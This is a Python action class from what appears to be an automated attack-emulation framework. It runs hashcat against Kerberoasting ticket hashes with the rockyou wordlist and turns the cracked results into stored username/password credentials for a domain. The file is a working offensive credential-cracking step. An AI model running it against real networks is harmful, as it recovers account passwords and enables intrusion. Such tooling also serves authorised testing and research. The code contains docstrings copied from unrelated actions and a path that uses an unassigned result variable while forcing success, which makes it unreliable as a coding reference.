import re
from pathlib import Path

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from motifs import ActionInputMotif, ActionOutputMotif
from Session import SessionManager


class HashcatCrackKerberosHashes(Action):
    """
    Crack Kerberos hashes using Hashcat.
    This action targets File entities with file_type='kerberoasting_hashes'.
    Supports Kerberoasting (Kerberos tickets).
    This action requires:
    - A File entity with file_type='kerberoasting_hashes' containing Kerberos hashes
    - The rockyou.txt.gz wordlist to be present in /usr/share/wordlists/
    """

    def __init__(self):
        super().__init__("HashcatCrackKerberosHashes", "T1110", "TA0006", [])
        self.noise = 0
        self.impact = 0.7
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for HashcatCrackKerberosHashes.

        AsRepRoasting password hashes

        Returns:
            ActionInputMotif: Input motif requiring a file containing AsRep password hashes
        """
        input_motif = ActionInputMotif(
            name="InputMotif_HashcatCrackKerberosHashes",
            description="Input requirements for Hashcat Crack Kerberos Hashes command",
        )
        input_motif.add_template(
            entity=Entity('File', alias='file', file_type='kerberoasting_hashes'), template_name="existing_file"
        )
        input_motif.add_template(
            entity=Entity('DomainPartition', alias='domain'),
            template_name="existing_domain",
            match_on="existing_file",
            relationship_type="has",
        )
        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif templates for FastNmapScan.

        Defines templates for:
        - Discovered assets (linked to subnet via belongs_to relationship)
        - Open ports (linked to assets via has relationship)

        Returns:
            ActionOutputMotif: Output motif with asset and port templates
        """
        output_motif = ActionOutputMotif(
            name="hashcatcrackkerberoshashes_output",
            description="Templates for cracked password hashes",
        )

        output_motif.add_template(
            entity=Entity('Credentials', alias='creds'),
            template_name="discovered_credentials",
            match_on=Entity('DomainPartition'),
            relationship_type='secured_with',
            invert_relationship=True,
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Expected to discover passwords from Kerberos attack.
        """
        file_entity = pattern.get('file')
        file_name = file_entity.get('name') if file_entity else 'unknown'
        return [
            f"Use the hashcat tool to obtain the credentials of users using the password hashes obtained in {file_name}"
        ]

    def get_target_query(self) -> Query:
        """
        Target File entities containing kerberoasting or ASREP hashes.
        """
        query = self.input_motif.get_query()
        query.ret_all()
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute hashcat to crack Kerberos hashes from the provided file.
        """
        file_entity = pattern.get('file')
        hash_file_path = file_entity.get('location') if file_entity else None

        if not hash_file_path:
            return ActionExecutionResult(
                command=["hashcat"], stderr=f"Hash file not found: {hash_file_path}", exit_status=1
            )

        # Check if the hash file actually exists
        if not Path(hash_file_path).exists():
            return ActionExecutionResult(
                command=["hashcat"], stderr=f"Hash file not found: {hash_file_path}", exit_status=1
            )

        wordlist_path = "/usr/share/wordlists/rockyou.txt.gz"
        if not Path(wordlist_path).exists():
            return ActionExecutionResult(
                command=["hashcat"], stderr=f"Wordlist not found: {wordlist_path}", exit_status=1
            )

        output_filename = "cracked_hashes.txt"
        output_uuid = artefacts.placeholder(output_filename)
        output_path = artefacts.get_path(output_uuid)

        try:
            command_output = shell(
                "hashcat",
                [
                    "-m",
                    "13100",
                    "--force",
                    "-a",
                    "0",
                    str(hash_file_path),
                    wordlist_path,
                    "--outfile",
                    str(output_path),
                    "--outfile-format",
                    "1,2",
                    "--outfile-autohex-disable",
                    "--potfile-disable",
                ],
                ok_code=[0, 1],
            )

            # Hashcat often returns non-zero exit status even when successful
            # Check if the output file was created and has content
            if Path(output_path).exists() and Path(output_path).stat().st_size > 0:
                # Create a successful result even if hashcat returned non-zero
                # ActionExecutionResult(command=command_output.command, stdout=command_output.stdout, stderr=command_output.stderr, exit_status=0, artefacts=command_output.artefacts if hasattr(command_output, 'artefacts') else {})
                exec_result = ActionExecutionResult(
                    command=command_output.command,
                    stdout=command_output.stdout,
                    stderr=command_output.stderr,
                    exit_status=0,  # Force success if output file exists
                    artefacts=command_output.artefacts if hasattr(command_output, 'artefacts') else {},
                )
            exec_result.artefacts["cracked_hashes"] = output_uuid

        except Exception as e:
            # If shell command fails completely, return error
            return ActionExecutionResult(
                command=["hashcat"], stderr=f"Hashcat execution failed: {str(e)}", exit_status=1
            )

        return exec_result

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Parse cracked hashes and update User entities with discovered passwords.
        """
        discovered_data = self.parse_output(output, artefacts)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes

    def parse_output(self, output, artefacts: ArtefactManager) -> dict:
        """
        Parse the output of the HashcatCrackAsRepHashes.
        """
        discovered_credentials = []
        if "cracked_hashes" not in output.artefacts:
            return {"discovered_credentials": discovered_credentials}

        output_uuid = output.artefacts["cracked_hashes"]

        # Parse the cracked hashes from the output file
        # With format 1,2 we get both hash:password and password lines
        with artefacts.open(output_uuid, 'rb') as f:
            content = f.read().decode('utf-8').strip()
            if not content:
                return {"discovered_credentials": discovered_credentials}

            # Process only the hash:password lines (format 1,2) because we use --outfile-format 1,2
            for line in content.split('\n'):
                line = line.strip()
                if not line:
                    continue

                # Look for hash:password format (format 1,2)
                if ':' in line and line.startswith('$krb5tgs$'):
                    # Split on the last colon to get password (hash may contain multiple colons)
                    hash_part, password = line.rsplit(':', 1)

                    # Determine crack method and extract username
                    username_match = re.search(r'\$23\$\*([^$]+)\$', hash_part)
                    if username_match:
                        username = username_match.group(1)
                        password = password.strip()

                        if username and password:
                            discovered_credentials.append({'username': username, 'password': password})

        return {"discovered_credentials": discovered_credentials}

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        """
        Populate output motif templates using the motif instantiation system.

        This method:
        1. Resets the output motif context for this execution
        2. Instantiates the discovered_credentials template for each discovered credential
        3. Instantiates the discovered_user template for each discovered user

        Args:
            pattern: Input pattern containing the asset and service
            discovered_data: Dictionary containing parsed credential data

        Returns:
            StateChangeSequence containing all state changes
        """
        self.output_motif.reset_context()

        changes: StateChangeSequence = []
        if "discovered_credentials" in discovered_data and len(discovered_data["discovered_credentials"]):
            domain = pattern.get('domain')

            for cred_data in discovered_data["discovered_credentials"]:
                username = cred_data['username']
                password = cred_data['password']

                # Instantiate credentials template using motif system
                cred_change = self.output_motif.instantiate(
                    "discovered_credentials", match_on_override=domain, username=username, password=password
                )
                changes.append(cred_change)

        return changes
